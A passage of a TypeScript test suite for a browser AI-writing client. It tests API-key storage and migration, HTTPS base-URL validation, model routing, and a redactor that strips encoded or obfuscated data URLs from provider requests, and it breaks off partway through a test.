import assert from 'node:assert/strict';
import { performance } from 'node:perf_hooks';
import test from 'node:test';
import { micromark } from 'micromark';
import {
  PUBLIC_AI_CONFIG_SESSION_STORAGE_KEY,
  PUBLIC_AI_CONFIG_STORAGE_KEY,
  clearPublicAiConfig,
  getPublicAiSettingsSaveErrorKind,
  readPublicAiConfig,
  resolvePublicAiChatCompletionsUrl,
  savePublicAiSettings,
  validatePublicAiBaseUrl,
  writePublicAiConfig,
} from './config';
import {
  createPublicAiAdapter,
  PUBLIC_AI_MAX_INSTRUCTION_CHARS,
  PUBLIC_AI_MAX_SELECTION_CHARS,
  PUBLIC_AI_MAX_USER_PROMPT_CHARS,
} from './client';
import {
  PUBLIC_AI_MAX_RAW_SOURCE_CODE_UNITS,
  PUBLIC_AI_MAX_REDACTED_SPANS,
  collectPublicAiSensitiveDataSpans,
  collectPublicAiLocalImageDataUrlSpans,
  omitPublicAiLocalImageDataUrls,
} from './redact';
import { hasPublicAiUnsafeHtmlSource } from './sourceKind';
import { PublicAiError, type PublicAiConfig, type PublicAiRequest } from './types';

const ONE_PIXEL_PNG_BASE64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=';

class MemoryStorage implements Storage {
  private readonly values = new Map<string, string>();

  get length(): number {
    return this.values.size;
  }

  clear(): void {
    this.values.clear();
  }

  getItem(key: string): string | null {
    return this.values.get(key) ?? null;
  }

  key(index: number): string | null {
    return [...this.values.keys()][index] ?? null;
  }

  removeItem(key: string): void {
    this.values.delete(key);
  }

  setItem(key: string, value: string): void {
    this.values.set(key, String(value));
  }
}

type StorageOperation = 'get' | 'remove' | 'set';

class FailingStorage extends MemoryStorage {
  private failure: { key: string; operation: StorageOperation } | null = null;

  failNext(operation: StorageOperation, key: string): void {
    this.failure = { key, operation };
  }

  private maybeFail(operation: StorageOperation, key: string): void {
    if (this.failure?.operation !== operation || this.failure.key !== key) return;
    this.failure = null;
    throw new Error(`blocked_${operation}`);
  }

  override getItem(key: string): string | null {
    this.maybeFail('get', key);
    return super.getItem(key);
  }

  override removeItem(key: string): void {
    this.maybeFail('remove', key);
    super.removeItem(key);
  }

  override setItem(key: string, value: string): void {
    this.maybeFail('set', key);
    super.setItem(key, value);
  }
}

const createStorage = () => ({
  localStorage: new MemoryStorage(),
  sessionStorage: new MemoryStorage(),
});

const configured = (overrides: Partial<PublicAiConfig> = {}): PublicAiConfig => ({
  apiKey: 'secret-key',
  baseUrl: 'https://models.example.com/v1',
  models: {
    generate: 'generate-model',
    modify: 'modify-model',
    summarize: 'summarize-model',
  },
  persistApiKey: false,
  ...overrides,
});

const createSourceActionRequest = (
  action: 'generate' | 'modify' | 'summarize',
  input: {
    diagnostic?: string;
    instruction?: string;
    range: { start: number; end: number };
    selectedText?: string;
    source: string;
    sourceKind: 'html' | 'markdown' | 'text';
  },
): PublicAiRequest => action === 'modify'
  ? { ...input, action, patchRange: input.range }
  : { ...input, action };

const jsonResponse = (body: unknown, status = 200): Response => new Response(JSON.stringify(body), {
  status,
  headers: { 'content-type': 'application/json' },
});

test('legacy thin settings are read without mutating storage and migrate on save', () => {
  const storage = createStorage();
  storage.localStorage.setItem('morndraft.oss.ai.config', JSON.stringify({
    baseUrl: 'https://legacy.example.com/v1',
    models: ['generate-v1', 'modify-v1'],
  }));
  storage.sessionStorage.setItem('morndraft.oss.ai.session-key', 'session-secret');

  const legacy = readPublicAiConfig(storage);
  assert.deepEqual(legacy, {
    apiKey: 'session-secret',
    baseUrl: 'https://legacy.example.com/v1',
    models: {
      generate: 'generate-v1',
      modify: 'modify-v1',
      summarize: 'generate-v1',
    },
    persistApiKey: false,
  });
  assert.notEqual(storage.localStorage.getItem('morndraft.oss.ai.config'), null);

  writePublicAiConfig(legacy, storage);
  assert.equal(storage.localStorage.getItem('morndraft.oss.ai.config'), null);
  assert.equal(storage.sessionStorage.getItem('morndraft.oss.ai.session-key'), null);
  assert.equal(storage.localStorage.getItem('morndraft.oss.ai.key'), null);
  assert.equal(JSON.parse(storage.localStorage.getItem(PUBLIC_AI_CONFIG_STORAGE_KEY) ?? '{}').apiKey, '');
  assert.equal(
    JSON.parse(storage.sessionStorage.getItem(PUBLIC_AI_CONFIG_SESSION_STORAGE_KEY) ?? '{}').apiKey,
    'session-secret',
  );
});

test('persistApiKey is explicit and clear removes canonical and legacy keys', () => {
  const storage = createStorage();
  writePublicAiConfig(configured({ persistApiKey: true }), storage);
  assert.equal(JSON.parse(storage.localStorage.getItem(PUBLIC_AI_CONFIG_STORAGE_KEY) ?? '{}').apiKey, 'secret-key');
  writePublicAiConfig(configured({ persistApiKey: false }), storage);
  assert.equal(JSON.parse(storage.localStorage.getItem(PUBLIC_AI_CONFIG_STORAGE_KEY) ?? '{}').apiKey, '');
  clearPublicAiConfig(storage);
  assert.equal(storage.localStorage.length, 0);
  assert.equal(storage.sessionStorage.length, 0);
});

test('settings save reports blocked browser storage instead of pretending persistence succeeded', () => {
  const blocked = new MemoryStorage();
  blocked.setItem = () => { throw new Error('blocked'); };
  assert.throws(
    () => writePublicAiConfig(configured(), { localStorage: new MemoryStorage(), sessionStorage: blocked }),
    (error: unknown) => error instanceof PublicAiError && error.code === 'storage_error',
  );
});

test('settings save restores session, local and legacy values when any storage step fails', () => {
  const legacyConfigKey = 'morndraft.oss.ai.config';
  const legacyPersistedKey = 'morndraft.oss.ai.key';
  const legacySessionKey = 'morndraft.oss.ai.session-key';
  const cases: Array<{
    failingStore: 'localStorage' | 'sessionStorage';
    key: string;
    operation: StorageOperation;
  }> = [
    { failingStore: 'sessionStorage', key: PUBLIC_AI_CONFIG_SESSION_STORAGE_KEY, operation: 'set' },
    { failingStore: 'localStorage', key: PUBLIC_AI_CONFIG_STORAGE_KEY, operation: 'set' },
    { failingStore: 'localStorage', key: legacyConfigKey, operation: 'remove' },
  ];

  for (const item of cases) {
    const localStorage = new FailingStorage();
    const sessionStorage = new FailingStorage();
    const storage = { localStorage, sessionStorage };
    const oldSessionConfig = JSON.stringify(configured({ apiKey: 'old-session-key' }));
    const oldLocalConfig = JSON.stringify(configured({ apiKey: 'old-local-key', persistApiKey: true }));
    localStorage.setItem(PUBLIC_AI_CONFIG_STORAGE_KEY, oldLocalConfig);
    localStorage.setItem(legacyConfigKey, '{"baseUrl":"https://legacy.example.com/v1"}');
    localStorage.setItem(legacyPersistedKey, 'old-legacy-local-key');
    sessionStorage.setItem(PUBLIC_AI_CONFIG_SESSION_STORAGE_KEY, oldSessionConfig);
    sessionStorage.setItem(legacySessionKey, 'old-legacy-session-key');
    storage[item.failingStore].failNext(item.operation, item.key);

    assert.throws(
      () => writePublicAiConfig(configured({ apiKey: 'new-key', persistApiKey: false }), storage),
      (error: unknown) => error instanceof PublicAiError && error.code === 'storage_error',
    );
    assert.equal(sessionStorage.getItem(PUBLIC_AI_CONFIG_SESSION_STORAGE_KEY), oldSessionConfig);
    assert.equal(localStorage.getItem(PUBLIC_AI_CONFIG_STORAGE_KEY), oldLocalConfig);
    assert.equal(localStorage.getItem(legacyConfigKey), '{"baseUrl":"https://legacy.example.com/v1"}');
    assert.equal(localStorage.getItem(legacyPersistedKey), 'old-legacy-local-key');
    assert.equal(sessionStorage.getItem(legacySessionKey), 'old-legacy-session-key');
  }
});

test('shared settings save controller distinguishes required, URL and storage failures', () => {
  let caught: unknown;
  try {
    savePublicAiSettings(configured({ models: { generate: '', modify: 'm', summarize: 's' } }), createStorage());
  } catch (error) {
    caught = error;
  }
  assert.equal(getPublicAiSettingsSaveErrorKind(caught), 'required');

  try {
    savePublicAiSettings(configured({ baseUrl: 'http://models.example.com/v1' }), createStorage());
  } catch (error) {
    caught = error;
  }
  assert.equal(getPublicAiSettingsSaveErrorKind(caught), 'invalid_base_url');

  const blocked = new MemoryStorage();
  blocked.setItem = () => { throw new Error('blocked'); };
  try {
    savePublicAiSettings(configured(), { localStorage: blocked, sessionStorage: new MemoryStorage() });
  } catch (error) {
    caught = error;
  }
  assert.equal(getPublicAiSettingsSaveErrorKind(caught), 'storage_error');
});

test('base URL validation allows HTTPS and localhost HTTP only', () => {
  assert.equal(validatePublicAiBaseUrl('https://models.example.com/v1/').origin, 'https://models.example.com');
  assert.equal(validatePublicAiBaseUrl('http://localhost:11434/v1').origin, 'http://localhost:11434');
  assert.equal(
    resolvePublicAiChatCompletionsUrl('https://models.example.com/v1/'),
    'https://models.example.com/v1/chat/completions',
  );
  assert.equal(
    resolvePublicAiChatCompletionsUrl('https://models.example.com/v1/chat/completions'),
    'https://models.example.com/v1/chat/completions',
  );
  assert.throws(() => validatePublicAiBaseUrl('http://models.example.com/v1'), (error: unknown) => (
    error instanceof PublicAiError && error.code === 'invalid_base_url'
  ));
  assert.throws(() => validatePublicAiBaseUrl('https://token@models.example.com/v1'), PublicAiError);
  assert.throws(() => validatePublicAiBaseUrl('https://models.example.com/v1?key=secret'), PublicAiError);
});

test('adapter routes generate, modify, summarize and fix to the correct models', async () => {
  const seen: Array<{ body: Record<string, unknown>; headers: Headers; url: string }> = [];
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async (input, init) => {
      seen.push({
        body: JSON.parse(String(init?.body)) as Record<string, unknown>,
        headers: new Headers(init?.headers),
        url: String(input),
      });
      return jsonResponse({ choices: [{ message: { content: 'result' }, finish_reason: 'stop' }] });
    },
  });

  for (const action of ['generate', 'modify', 'summarize', 'fix'] as const) {
    const source = 'selection private full source';
    const range = { start: 0, end: 'selection'.length };
    const request: PublicAiRequest = action === 'fix'
      ? { action, instruction: 'do this', source, sourceKind: 'text' }
      : createSourceActionRequest(action, {
          instruction: 'do this',
          range,
          source,
          sourceKind: 'text',
        });
    const result = await adapter.request(request);
    assert.deepEqual(result, { text: 'result', finishReason: 'stop' });
  }
  assert.deepEqual(seen.map(entry => entry.body.model), [
    'generate-model',
    'modify-model',
    'summarize-model',
    'modify-model',
  ]);
  assert.ok(seen.every(entry => entry.url === 'https://models.example.com/v1/chat/completions'));
  assert.ok(seen.every(entry => entry.headers.get('authorization') === 'Bearer secret-key'));
  assert.ok(seen.every(entry => entry.body.stream === false));
  const summarizeMessages = seen[2].body.messages as Array<{ content: string }>;
  assert.doesNotMatch(summarizeMessages[1].content, /private full source/u);
});

test('actual provider JSON has one privacy-safe serialization path for every action variant', async () => {
  const resource = 'data:application/octet-stream;base64,QUJD)';
  const source = `SAFE\n${resource}\nTAIL`;
  const safeRange = { start: 0, end: 4 };
  const seen: Array<{ body: Record<string, unknown>; label: string }> = [];
  let activeLabel = '';
  const adapter = createPublicAiAdapter({
    createResourceNamespace: () => 'TESTNSPC',
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      const body = JSON.parse(String(init?.body)) as Record<string, unknown>;
      seen.push({ body, label: activeLabel });
      const messages = body.messages as Array<{ content: string }>;
      const userPrompt = messages[1]?.content ?? '';
      const fixSource = userPrompt.split('Full source to repair:\n')[1];
      return jsonResponse({ choices: [{ message: { content: fixSource ?? 'result' } }] });
    },
  });
  const commonEncodedFields = {
    diagnostic: `diagnostic ${resource}`,
    instruction: `instruction ${resource}`,
  };
  const requests: Array<{ label: string; request: PublicAiRequest }> = [
    {
      label: 'generate-source',
      request: {
        action: 'generate',
        ...commonEncodedFields,
        range: safeRange,
        source,
        sourceKind: 'text',
      },
    },
    {
      label: 'modify-source',
      request: {
        action: 'modify',
        ...commonEncodedFields,
        patchRange: safeRange,
        range: safeRange,
        selectedText: resource,
        source,
        sourceKind: 'text',
        visibleText: resource,
      } as unknown as PublicAiRequest,
    },
    {
      label: 'summarize-source',
      request: {
        action: 'summarize',
        ...commonEncodedFields,
        range: safeRange,
        selectedText: resource,
        source,
        sourceKind: 'text',
      },
    },
    {
      label: 'summarize-visible',
      request: {
        action: 'summarize',
        ...commonEncodedFields,
        visibleText: `VISIBLE ${resource} TAIL`,
      },
    },
    {
      label: 'fix-source',
      request: {
        action: 'fix',
        ...commonEncodedFields,
        source,
        sourceKind: 'text',
      },
    },
  ];

  for (const item of requests) {
    activeLabel = item.label;
    await adapter.request(item.request);
  }

  assert.deepEqual(seen.map(item => item.label), requests.map(item => item.label));
  assert.deepEqual(seen.map(item => item.body.model), [
    'generate-model',
    'modify-model',
    'summarize-model',
    'summarize-model',
    'modify-model',
  ]);
  for (const { body, label } of seen) {
    assert.deepEqual(Object.keys(body).sort(), ['messages', 'model', 'stream', 'temperature'], label);
    const messages = body.messages as Array<{ content: string; role: string }>;
    assert.deepEqual(messages.map(message => message.role), ['system', 'user'], label);
    const serialized = JSON.stringify(body);
    assert.doesNotMatch(serialized, /data:|application\/octet-stream|QUJD/iu, label);
    assert.match(messages[1]?.content ?? '', /local image data omitted/u, label);
  }
  assert.doesNotMatch(
    JSON.stringify(seen.find(item => item.label === 'modify-source')?.body),
    /selectedText|visibleText/iu,
  );
  assert.match(
    (seen.find(item => item.label === 'fix-source')?.body.messages as Array<{ content: string }>)[1]?.content ?? '',
    /TESTNSPC0000_/u,
  );
});

test('finish_reason length is returned to the caller without silently discarding text', async () => {
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async () => jsonResponse({
      choices: [{ message: { content: 'partial output' }, finish_reason: 'length' }],
    }),
  });
  assert.deepEqual(await adapter.request({
    action: 'generate',
    source: '',
    sourceKind: 'text',
    range: { start: 0, end: 0 },
  }), {
    text: 'partial output',
    finishReason: 'length',
  });
});

test('adapter omits local image data and rejects oversized prompts before fetch', async () => {
  const seen: string[] = [];
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      seen.push(String(init?.body));
      return jsonResponse({ choices: [{ message: { content: 'result' } }] });
    },
  });
  const source = `selection before data:image/png;base64,${'A'.repeat(2_000)} after`;
  await adapter.request({
    action: 'modify',
    patchRange: { start: 0, end: 'selection'.length },
    source,
    sourceKind: 'text',
    range: { start: 0, end: 'selection'.length },
  });
  assert.equal(seen.length, 1);
  assert.doesNotMatch(seen[0], /data:image|AAAAAA/u);
  assert.match(seen[0], /local image data omitted/u);

  await assert.rejects(adapter.request({
    action: 'generate',
    instruction: 'x'.repeat(PUBLIC_AI_MAX_USER_PROMPT_CHARS + 1),
    source: '',
    sourceKind: 'text',
    range: { start: 0, end: 0 },
  }), (error: unknown) => error instanceof PublicAiError && error.code === 'input_too_large');
  await assert.rejects(adapter.request({
    action: 'generate',
    source: 'x'.repeat(PUBLIC_AI_MAX_RAW_SOURCE_CODE_UNITS + 1),
    sourceKind: 'text',
    range: { start: 0, end: 0 },
  }), (error: unknown) => error instanceof PublicAiError && error.code === 'input_too_large');
  assert.equal(seen.length, 1, 'oversized prompts must fail before fetch');
});

test('shared redactor removes folded and percent-encoded data URLs from the actual fetch body', async () => {
  const foldedTail = 'Rk9MREVEX1BBWUxPQURfVEFJTA==';
  const foldedImage = `data:image/png;base64,QUJDREVGR0hJ\r\n\t${foldedTail}`;
  const encodedTail = 'VEFJTF9TRU5USU5FTA==';
  const encodedImage = `data:image/png;base64,QUJD%0A${encodedTail}`;
  assert.deepEqual(collectPublicAiLocalImageDataUrlSpans(`x ${foldedImage}) y`), [{
    start: 2,
    end: 2 + foldedImage.length,
  }]);
  assert.equal(omitPublicAiLocalImageDataUrls(`x ${foldedImage}) y`), 'x [local image data omitted]) y');
  assert.deepEqual(collectPublicAiLocalImageDataUrlSpans(`x ${encodedImage}) y`), [{
    start: 2,
    end: 2 + encodedImage.length,
  }]);
  assert.equal(omitPublicAiLocalImageDataUrls(`x ${encodedImage}) y`), 'x [local image data omitted]) y');
  assert.deepEqual(collectPublicAiLocalImageDataUrlSpans('x data:image/png;base64,QUJD%ZZTAIL'), [{
    start: 2,
    end: 2 + 'data:image/png;base64,QUJD'.length,
  }]);

  let requestBody = '';
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      requestBody = String(init?.body);
      return jsonResponse({ choices: [{ message: { content: 'result' } }] });
    },
  });
  const source = `SAFE before ${foldedImage}) ${encodedImage}) after`;
  await adapter.request({
    action: 'modify',
    instruction: `selection ${foldedImage}) ${encodedImage})`,
    patchRange: { start: 0, end: 4 },
    source,
    sourceKind: 'text',
    range: { start: 0, end: 4 },
  });

  assert.doesNotMatch(
    requestBody,
    /data:image|QUJDREVGR0hJ|Rk9MREVEX1BBWUxPQURfVEFJTA|%0A|VEFJTF9TRU5USU5FTA/u,
  );
  assert.match(requestBody, /local image data omitted/u);
});

test('shared redactor accepts image MIME parameters and fails closed for non-base64 image data', async () => {
  const parameterizedPng = `DaTa: ImAgE/PnG;charset=utf-8; BaSe64,${ONE_PIXEL_PNG_BASE64}`;
  const base64Svg = 'data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjwvc3ZnPg==';
  const encodedSvg = 'data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%3E%3C/svg%3E';

  assert.equal(
    omitPublicAiLocalImageDataUrls(`before ${parameterizedPng}) after`),
    'before [local image data omitted]) after',
  );
  assert.equal(
    omitPublicAiLocalImageDataUrls(`before ${base64Svg}) after`),
    'before [local image data omitted]) after',
  );
  assert.equal(
    omitPublicAiLocalImageDataUrls(`before ${encodedSvg}) private tail`),
    'before [local image data omitted]',
  );
  assert.equal(
    omitPublicAiLocalImageDataUrls('before data:image/png;charset=utf-8 private tail'),
    'before [local image data omitted]',
  );
  assert.equal(
    omitPublicAiLocalImageDataUrls('before data:text/plain;base64,QUJD after'),
    'before [local image data omitted]',
  );

  let requestBody = '';
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      requestBody = String(init?.body);
      return jsonResponse({ choices: [{ message: { content: 'result' } }] });
    },
  });
  const source = `SAFE before ${parameterizedPng}) ${encodedSvg} SOURCE_PRIVATE_TAIL`;
  await adapter.request({
    action: 'modify',
    instruction: `selection ${parameterizedPng}) ${encodedSvg} SVG_PRIVATE_TAIL`,
    patchRange: { start: 0, end: 4 },
    source,
    sourceKind: 'text',
    range: { start: 0, end: 4 },
  });

  assert.doesNotMatch(
    requestBody,
    /data:image|iVBORw0KGgo|PHN2Zy|%3Csvg|SVG_PRIVATE_TAIL|SOURCE_PRIVATE_TAIL/iu,
  );
  assert.match(requestBody, /local image data omitted/u);
});

test('shared redactor keeps original UTF-16 offsets for ASCII-insensitive prefixes', () => {
  const unicodePrefix = 'İ'.repeat(256);
  const image = `DaTa:ImAgE/PnG;BaSe64,${ONE_PIXEL_PNG_BASE64}`;
  const value = `${unicodePrefix}${image}`;

  assert.deepEqual(collectPublicAiLocalImageDataUrlSpans(value), [{
    start: unicodePrefix.length,
    end: value.length,
  }]);
  assert.equal(
    omitPublicAiLocalImageDataUrls(value),
    `${unicodePrefix}[local image data omitted]`,
  );
});

test('shared redactor splits adjacent local images before consuming the next prefix', () => {
  const lowerImage = `data:image/png;base64,${ONE_PIXEL_PNG_BASE64}`;
  const upperImage = `DATA:IMAGE/PNG;BASE64,${ONE_PIXEL_PNG_BASE64}`;

  for (const separator of ['\n', '\r\n', '\t']) {
    const value = `${lowerImage}${separator}${upperImage}`;
    const spans = collectPublicAiLocalImageDataUrlSpans(value);
    assert.equal(spans.length, 2, `expected two spans for ${JSON.stringify(separator)}`);
    assert.equal(spans[0]?.start, 0);
    assert.equal(spans[1]?.start, lowerImage.length + separator.length);
    const redacted = omitPublicAiLocalImageDataUrls(value);
    assert.doesNotMatch(redacted, /data:image|iVBORw0KGgo/iu);
    assert.equal(redacted.match(/\[local image data omitted\]/gu)?.length, 2);
  }
});

test('adapter fetch body omits Unicode-prefixed and whitespace-adjacent local images', async () => {
  const unicodePrefix = 'İ'.repeat(256);
  const lowerImage = `data:image/png;base64,${ONE_PIXEL_PNG_BASE64}`;
  const upperImage = `DATA:IMAGE/PNG;BASE64,${ONE_PIXEL_PNG_BASE64}`;
  const source = `SAFE${unicodePrefix}${lowerImage}\n${upperImage}\r\n${lowerImage}\t${upperImage}`;
  let requestBody = '';
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      requestBody = String(init?.body);
      return jsonResponse({ choices: [{ message: { content: 'result' } }] });
    },
  });

  await adapter.request({
    action: 'modify',
    patchRange: { start: 0, end: 4 },
    source,
    sourceKind: 'text',
    range: { start: 0, end: 4 },
  });

  assert.doesNotMatch(requestBody, /data:image|iVBORw0KGgo|ASUVORK5CYII=/iu);
  assert.match(requestBody, /local image data omitted/u);
});

test('bounded source context never exposes a resource split by either context slice edge', async () => {
  const payload = 'QUJD'.repeat(10_000);
  const resource = `data:application/octet-stream;base64,${payload})`;
  const sources = [
    `SAFE ${resource} TARGET`,
    `TARGET ${resource} SAFE`,
  ];
  const bodies: string[] = [];
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      bodies.push(String(init?.body));
      return jsonResponse({ choices: [{ message: { content: 'result' } }] });
    },
  });
  for (const source of sources) {
    const start = source.indexOf('TARGET');
    await adapter.request({
      action: 'modify',
      patchRange: { start, end: start + 'TARGET'.length },
      range: { start, end: start + 'TARGET'.length },
      source,
      sourceKind: 'text',
    });
  }
  assert.equal(bodies.length, 2);
  for (const body of bodies) {
    assert.doesNotMatch(body, /data:application|QUJDQUJDQUJD/iu);
    assert.match(body, /local image data omitted/u);
  }
});

test('bounded source context remains at most 24k after thousands of placeholders expand', async () => {
  const resources = 'data:;base64,A)'.repeat(PUBLIC_AI_MAX_REDACTED_SPANS / 2);
  const source = `${resources}\nTARGET\n${resources}`;
  const start = source.indexOf('TARGET');
  let providerPrompt = '';
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      const body = JSON.parse(String(init?.body)) as { messages: Array<{ content: string }> };
      providerPrompt = body.messages[1]?.content ?? '';
      return jsonResponse({ choices: [{ message: { content: 'result' } }] });
    },
  });
  await adapter.request({
    action: 'modify',
    patchRange: { start, end: start + 'TARGET'.length },
    source,
    sourceKind: 'text',
    range: { start, end: start + 'TARGET'.length },
  });
  const context = providerPrompt.split('Relevant source context:\n')[1] ?? '';
  assert.ok(context.length > 0);
  assert.ok(context.length <= 24_000, `context length ${context.length} must stay within 24k`);
  assert.doesNotMatch(context, /data:;base64|\[local image data omitt(?!ed\])/u);
  assert.match(context, /\[local image data omitted\]/u);
  assert.match(context, /\[(?:earlier|later) source omitted\]/u);
});

test('single-pass scanner composes HTML entities, CSS escapes and URL whitespace with original offsets', () => {
  const variants = [
    'data:;base64,QUJD)',
    'DaTa:text/plain;base64,QUJD)',
    'data:application/octet-stream;base64,QUJD)',
    'data:%69mage/png;base64,QUJD)',
    'd&#x61;ta&#58;;base64,QUJD)',
    '&#x64;ata&colon;;base64,QUJD)',
    String.raw`\64 ata\3a ;base64,QUJD)`,
    String.raw`&#92;64 ata&#92;3a ;base64,QUJD)`,
    String.raw`d&#97;t\61&#58;;base64,QUJD)`,
    'da\r\nta:;base64,QUJD)',
    'd&Tab;a&NewLine;t&#97;&colon;;base64,QUJD)',
  ];
  for (const candidate of variants) {
    const value = `PREFIX ${candidate} suffix`;
    const spans = collectPublicAiSensitiveDataSpans(value);
    assert.equal(spans.length, 1, candidate);
    assert.deepEqual(spans[0], {
      start: 'PREFIX '.length,
      end: 'PREFIX '.length + candidate.length - 1,
      exact: true,
    }, candidate);
    const omitted = omitPublicAiLocalImageDataUrls(value);
    assert.doesNotMatch(omitted, /QUJD|base64/iu, candidate);
  }

  const schemeVariants = [
    'data:',
    'd&#97;ta&colon;',
    String.raw`d&bsol;61ta&colon;`,
    String.raw`\64 &#97;ta&colon;`,
  ];
  const metadataVariants = [
    ';base64,',
    'text/plain;base64,',
    'text&sol;plain&semi;base64&comma;',
    'text&#47;plain&#59;base64&#44;',
  ];
  const bodyVariants = [
    'QUJD+/=',
    'QUJD&plus;&sol;&equals;',
    'QUJD&percnt;2B&percnt;2F&percnt;3D',
    'QUJD&#43;&#47;&#61;',
  ];
  for (const scheme of schemeVariants) {
    for (const metadata of metadataVariants) {
      for (const body of bodyVariants) {
        const candidate = `${scheme}${metadata}${body})`;
        const spans = collectPublicAiSensitiveDataSpans(candidate);
        assert.deepEqual(spans, [{ start: 0, end: candidate.length - 1, exact: true }], candidate);
        assert.equal(omitPublicAiLocalImageDataUrls(candidate), '[local image data omitted])', candidate);
      }
    }
  }

  for (const safe of [
    'metadata:text/plain;base64,QUJD',
    'notdata:;base64,QUJD',
    'met&#97;&#100;ata:text/plain;base64,QUJD',
    'not&#100;ata:;base64,QUJD',
    String.raw`meta\64 ata:text/plain;base64,QUJD`,
  ]) {
    assert.deepEqual(collectPublicAiSensitiveDataSpans(safe), [], safe);
  }
  assert.equal(
    omitPublicAiLocalImageDataUrls('ordinary text\r\ndata:;base64,QUJD)'),
    'ordinary text\r\n[local image data omitted])',
  );
});

test('data URL metadata fails closed on cross-browser control whitespace', async () => {
  const variants = [
    'data:image/png;\fbase64,QUJD!LITERAL_FF_LEAK suffix',
    'data:image/png;&#12;base64,QUJD!DECIMAL_FF_LEAK suffix',
    'data:image/png;&#xC;base64,QUJD!HEX_FF_LEAK suffix',
    String.raw`data:image/png;\c base64,QUJD!CSS_FF_LEAK suffix`,
    'data:text/pl\tain;ba\r\nse64,QUJD!LITERAL_URL_CONTROL_LEAK suffix',
    'data:text/pl&Tab;ain;ba&#13;&#10;se64,QUJD!ENTITY_URL_CONTROL_LEAK suffix',
    String.raw`data:text/pl\9 ain;ba\d \a se64,QUJD!CSS_URL_CONTROL_LEAK suffix`,
  ];
  const providerBodies: string[] = [];
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      providerBodies.push(String(init?.body));
      return jsonResponse({ choices: [{ message: { content: 'result' } }] });
    },
  });

  for (const candidate of variants) {
    const source = `SAFE ${candidate}`;
    assert.deepEqual(collectPublicAiSensitiveDataSpans(source), [{
      start: 'SAFE '.length,
      end: source.length,
      exact: false,
    }], candidate);
    assert.equal(omitPublicAiLocalImageDataUrls(source), 'SAFE [local image data omitted]', candidate);
    await adapter.request({
      action: 'modify',
      patchRange: { start: 0, end: 4 },
      source,
      sourceKind: 'text',
      range: { start: 0, end: 4 },
    });
  }

  assert.equal(providerBodies.length, variants.length);
  for (const body of providerBodies) {
    assert.doesNotMatch(
      body,
      /base64|QUJD|(?:LITERAL|DECIMAL|HEX|CSS)_FF_LEAK|(?:LITERAL|ENTITY|CSS)_URL_CONTROL_LEAK|&#(?:xC|12|13|10)|&Tab;|\\(?:c|9|d|a) /iu,
    );
    assert.match(body, /local image data omitted/u);
  }
});

test('decoded data URL fragments fail closed through the field end', () => {
  const variants = [
    'data:;base64,QUJD#FRAGMENT_SECRET',
    'data:;base64,QUJD&#35;FRAGMENT_SECRET',
    'data:;base64,QUJD&num;FRAGMENT_SECRET',
    String.raw`data:;base64,QUJD\23 FRAGMENT_SECRET`,
    String.raw`data:;base64,QUJD&#92;23 FRAGMENT_SECRET`,
    'data:text/plain&num;;base64,QUJD_FRAGMENT_SECRET',
    'data:;base64,QUJD#data:;base64,REVG_NESTED_SECRET',
  ];
  for (const candidate of variants) {
    const value = `SAFE ${candidate} AFTER_SECRET`;
    assert.deepEqual(collectPublicAiSensitiveDataSpans(value), [{
      start: 'SAFE '.length,
      end: value.length,
      exact: false,
    }], candidate);
    const omitted = omitPublicAiLocalImageDataUrls(value);
    assert.equal(omitted, 'SAFE [local image data omitted]', candidate);
    assert.doesNotMatch(omitted, /FRAGMENT_SECRET|NESTED_SECRET|AFTER_SECRET/u);
  }

  const percentEncodedHash = 'data:;base64,QUJD%23REVG) tail';
  assert.deepEqual(collectPublicAiSensitiveDataSpans(percentEncodedHash), [{
    start: 0,
    end: percentEncodedHash.indexOf(')'),
    exact: true,
  }], 'percent-encoded hash is data bytes, not a URL fragment delimiter');
});

test('fragment-bearing resources never reach config, fetch, or provider tail fields', async () => {
  let configReads = 0;
  let fetchCount = 0;
  const fixAdapter = createPublicAiAdapter({
    readConfig: () => {
      configReads += 1;
      return configured();
    },
    fetch: async () => {
      fetchCount += 1;
      return jsonResponse({ choices: [{ message: { content: 'unused' } }] });
    },
  });
  await assert.rejects(
    fixAdapter.request({
      action: 'fix',
      source: 'data:;base64,QUJD&num;FRAGMENT_SECRET',
      sourceKind: 'text',
    }),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
  );
  assert.equal(configReads, 0);
  assert.equal(fetchCount, 0);

  let providerBody = '';
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      providerBody = String(init?.body);
      return jsonResponse({ choices: [{ message: { content: 'result' } }] });
    },
  });
  const source = 'SAFE data:;base64,QUJD&#35;FRAGMENT_SECRET AFTER_SECRET';
  await adapter.request({
    action: 'modify',
    patchRange: { start: 0, end: 4 },
    source,
    sourceKind: 'text',
    range: { start: 0, end: 4 },
  });
  assert.doesNotMatch(providerBody, /QUJD|FRAGMENT_SECRET|AFTER_SECRET|&#35;/u);
  assert.match(providerBody, /local image data omitted/u);
});

test('scanner caps source size and span count and stays linear on a 2 MiB adversarial field', () => {
  const adversarial = 'notdata:'.repeat(Math.ceil((2 * 1024 * 1024) / 8));
  const startedAt = performance.now();
  assert.deepEqual(collectPublicAiSensitiveDataSpans(adversarial), []);
  assert.ok(performance.now() - startedAt < 1_500, '2 MiB scan must remain below 1.5 seconds');

  const many = 'data:;base64,A)'.repeat(PUBLIC_AI_MAX_REDACTED_SPANS + 128);
  const spans = collectPublicAiSensitiveDataSpans(many);
